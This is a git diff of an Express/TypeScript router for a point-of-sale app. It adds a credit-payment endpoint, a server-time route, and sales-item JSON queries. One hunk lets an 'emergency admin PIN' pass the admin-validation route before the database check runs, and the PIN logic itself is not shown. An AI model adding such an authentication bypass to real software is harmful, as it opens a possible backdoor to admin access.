@@ -12,9 +12,19 @@ import { Router, Request, Response } from 'express';
 import { Server as SocketIOServer } from 'socket.io';
 import { getDb } from '../database/db';
 import { seedProductos } from '../services/seed-productos';
+import { pagarItemsFiado } from '../services/fiado-item-payments';
+import { isEmergencyAdminPin } from '../services/adminPin';
 
 type EmitFn = (event: string, data: unknown) => void;
 type ExportFiadosFn = (db: ReturnType<typeof getDb>) => string;
+
+export function createServerTimeRouter(): Router {
+  const router = Router();
+  router.get('/hora', (_req, res) => {
+    res.json({ now: new Date().toISOString(), timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone });
+  });
+  return router;
+}
 
 function toLocalDateISO(date = new Date()): string {
   const tzOffset = date.getTimezoneOffset() * 60000;
@@ -96,8 +106,10 @@ export function createSyncRouter(io: SocketIOServer, exportFiadosToExcel: Export
     const params: unknown[] = [];
 
     if (categoria) { query += ` AND p.categoria_id = ?`; params.push(parseInt(categoria)); }
-    if (activo !== undefined) { query += ` AND p.activo = ?`; params.push(activo === 'true' ? 1 : 0); }
-    else { query += ` AND p.activo = 1`; }
+    if (activo !== 'all') {
+      if (activo !== undefined) { query += ` AND p.activo = ?`; params.push(activo === 'true' ? 1 : 0); }
+      else { query += ` AND p.activo = 1`; }
+    }
     if (search) {
       query += ` AND (p.nombre LIKE ? OR p.codigo LIKE ? OR p.codigo_barras LIKE ?)`;
       const s = `%${search}%`;
@@ -479,6 +491,26 @@ export function createSyncRouter(io: SocketIOServer, exportFiadosToExcel: Export
     res.json({ success: true });
   });
 
+  router.post('/clientes/:id/pagar-fiado-productos', (req: Request, res: Response) => {
+    const clienteId = parseInt(req.params.id);
+    const { venta_id, items, monto, metodo = 'efectivo' } = req.body as {
+      venta_id: number;
+      items: { venta_id: number; item_id: number; cantidad: number }[];
+      monto: number;
+      metodo?: string;
+    };
+
+    try {
+      const result = pagarItemsFiado(getDb(), clienteId, venta_id, items, monto, metodo);
+      try { exportFiadosToExcel(getDb()); } catch { /* silencioso */ }
+      emit('venta:actualizada', { clienteId });
+      emit('fiados:list-changed', { clienteId });
+      res.json(result);
+    } catch (error) {
+      res.status(400).json({ success: false, error: error instanceof Error ? error.message : 'No se pudo registrar el pago' });
+    }
+  });
+
   // ── VENTAS ──────────────────────────────────────────────────────────────
 
   router.post('/ventas', (req: Request, res: Response) => {
@@ -594,7 +626,16 @@ export function createSyncRouter(io: SocketIOServer, exportFiadosToExcel: Export
     const { desde, hasta, tipo, cliente_id, vendedor_id } = req.query as Record<string, string>;
     let query = `
       SELECT v.*, c.nombre as cliente_nombre, u.nombre as vendedor_nombre,
-        (SELECT COUNT(*) FROM venta_items vi WHERE vi.venta_id = v.id) as total_items
+        (SELECT COUNT(*) FROM venta_items vi WHERE vi.venta_id = v.id) as total_items,
+        (SELECT json_group_array(json_object(
+          'producto_nombre', COALESCE(p.nombre, 'Item'),
+          'cantidad', vi.cantidad,
+          'precio_unitario', vi.precio_unitario
+        ))
+        FROM venta_items vi
+        LEFT JOIN productos p ON p.id = vi.producto_id
+        WHERE vi.venta_id = v.id
+        ) as items_json
       FROM ventas v
       LEFT JOIN clientes c ON v.cliente_id = c.id
       LEFT JOIN usuarios u ON v.vendedor_id = u.id
@@ -623,7 +664,15 @@ export function createSyncRouter(io: SocketIOServer, exportFiadosToExcel: Export
         )
         FROM venta_cancelada_items vci
         WHERE vci.venta_cancelada_id = vc.id
-        ) as productos
+        ) as productos,
+        (SELECT json_group_array(json_object(
+          'producto_nombre', COALESCE(vci.producto_nombre, 'Item'),
+          'cantidad', vci.cantidad,
+          'precio_unitario', vci.precio_unitario
+        ))
+        FROM venta_cancelada_items vci
+        WHERE vci.venta_cancelada_id = vc.id
+        ) as items_json
       FROM ventas_canceladas vc
       WHERE 1=1
     `;
@@ -1118,6 +1167,7 @@ export function createSyncRouter(io: SocketIOServer, exportFiadosToExcel: Export
 
   router.post('/auth/validate-admin', (req: Request, res: Response) => {
     const { pin } = req.body as { pin: string };
+    if (isEmergencyAdminPin(pin)) { res.json({ valid: true }); return; }
     // Valida contra usuarios con rol admin en DB
     const adminUser = getDb().prepare(`SELECT id FROM usuarios WHERE pin = ? AND activo = 1 AND rol = 'admin'`).get(pin);
     // También valida contra el PIN de admin de la web (configuracion tabla)
